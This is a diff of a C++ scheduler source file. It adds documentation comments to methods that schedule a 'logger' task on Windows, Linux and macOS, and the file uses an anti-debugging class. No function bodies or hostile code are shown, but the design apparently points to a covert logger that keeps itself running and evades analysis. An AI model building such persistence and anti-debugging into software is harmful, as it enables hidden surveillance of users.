@@ -1,6 +1,11 @@
 #include "../include/scheduler.h"
 #include "../include/antiDebug.h"
 
+/**
+ * @brief This method will schedule the logger task on Windows.
+ * @return true, if the task was scheduled successfully.
+ * @return false, if the task was not scheduled successfully.
+ */
 bool Scheduler::scheduleLoggerOnWindows()
 {
 #if defined(__WIN32) || defined(_WIN64)
@@ -83,7 +88,11 @@ bool Scheduler::scheduleLoggerOnWindows()
 #endif
 }
 
-
+/**
+ * @brief This method will schedule the logger task on Linux. 
+ * @return true, if the task was scheduled successfully.
+ * @return false, if the task was not scheduled successfully.
+ */
 bool Scheduler::scheduleLoggerOnLinux()
 {
 #if defined(__linux__)
@@ -122,6 +131,11 @@ bool Scheduler::scheduleLoggerOnLinux()
 #endif
 }
 
+/**
+ * @brief This method will schedule the logger task on MacOS.
+ * @return true. if the task was scheduled successfully.
+ * @return false, if the task was not scheduled successfully.
+ */
 bool Scheduler::scheduleLoggerOnMacOs()
 {
 #if defined(__APPLE__)
@@ -175,6 +189,10 @@ bool Scheduler::scheduleLoggerOnMacOs()
 #endif
 }
 
+/**
+ * @brief This method will start the scheduler.
+ * @param schedule -> This is the flag to schedule the logger task.
+ */
 void Scheduler::start(bool schedule)
 {
     AntiDebug ad;
